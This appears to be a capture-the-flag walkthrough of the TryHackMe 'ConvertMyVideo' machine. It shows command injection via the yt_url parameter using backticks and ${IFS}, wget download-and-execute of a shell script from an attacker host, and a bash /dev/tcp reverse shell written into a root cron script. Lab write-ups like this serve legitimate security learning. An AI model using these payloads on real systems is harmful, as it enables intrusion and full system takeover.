# TryHackMe ConvertMyVideo Walkthrough

## **1. Initial Reconnaissance**
### **Nmap Scan**
We start by scanning the target `10.10.206.3` with an aggressive scan to detect open ports and services:
```bash
nmap -sC -sV -p- -T4 -o nmap_res 10.10.206.3
```
**Results:**
- **Port 22:** OpenSSH 7.6p1 (Ubuntu 4ubuntu0.3)
- **Port 80:** Apache HTTPD 2.4.29 (Ubuntu)

### **Directory Enumeration**
Using `dirsearch` to find accessible directories:
```bash
python3 dirsearch.py -u http://10.10.206.3:80
```
**Notable Findings:**
- `/admin/` (Requires Authentication)
- `/admin/_logs/` (Contains access and error logs)
- `/admin/upload.php` (Potential file upload vulnerability)
- `/tmp/` (Restricted but accessible)

## **2. Exploiting Command Injection via `yt_url`**
### **Identifying Vulnerability**
The website allows users to enter a YouTube URL, which is then passed to `youtube-dl`. By modifying this parameter, we can execute arbitrary commands.

Intercepting a request in Burp Suite:
```http
POST / HTTP/1.1
Host: 10.10.206.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

yt_url=https://www.youtube.com/watch?v=xyz
```

**Injecting Commands:**
The trick is to use **backticks (`) to execute commands first.**
```bash
yt_url=`id`
```
**Finding Internal Field Separator (`IFS`)**
The system **does not like spaces**, so we use `${IFS}`:
```bash
yt_url=`ls${IFS}-la`
```
**URL Encoded:**
```bash
yt_url=%60ls%24%7BIFS%7D-la%60
```

## **3. Gaining a Reverse Shell**
### **Step 1: Download a Shell Script**
Using `wget` to fetch a shell script from our attacking machine:
```bash
yt_url=`wget${IFS}http://10.8.14.7:8081/shell.sh`
```

### **Step 2: Change Permissions**
By default, execution permission is restricted. We set **777 permissions**:
```bash
yt_url=`chmod${IFS}777${IFS}shell.sh`
```

### **Step 3: Execute Shell Script**
```bash
yt_url=`sh${IFS}shell.sh`
```

### **Step 4: Start Listener**
On our local machine, start a listener:
```bash
nc -lvnp 9001
```
Once executed, we should receive a reverse shell!

## **4. Privilege Escalation**
### **Step 1: Enumerate Running Processes**
Checking for scheduled tasks:
```bash
ps aux
```
**Findings:**
- `cron` is running as **root**.

### **Step 2: Spy on Cron Jobs**
Using [`pspy`](https://github.com/DominicBreuker/pspy), a tool for monitoring scheduled jobs:
```bash
wget http://10.8.14.7:8081/pspy64
chmod +x pspy64
./pspy64
```
Identified `/tmp/clean.sh` running as root.

### **Step 3: Overwrite `clean.sh` with Reverse Shell**
```bash
echo "bash -i >& /dev/tcp/10.8.14.7/9091 0>&1" > /tmp/clean.sh
chmod 777 /tmp/clean.sh
```

### **Step 4: Start Another Listener**
```bash
nc -lvnp 9091
```
Once `clean.sh` executes, we receive a **root shell**! 🎉

## **5. Summary**
- **Recon:** Found open ports and sensitive directories.
- **Exploited Command Injection:** Used backticks and `${IFS}` to execute commands.
- **Reverse Shell:** Used `wget` to download a script and executed it.
- **Privilege Escalation:** Found and exploited a cron job running as root.
- **Root Access:** Replaced `clean.sh` with a reverse shell and gained full control.

🚀 **Challenge Complete!**

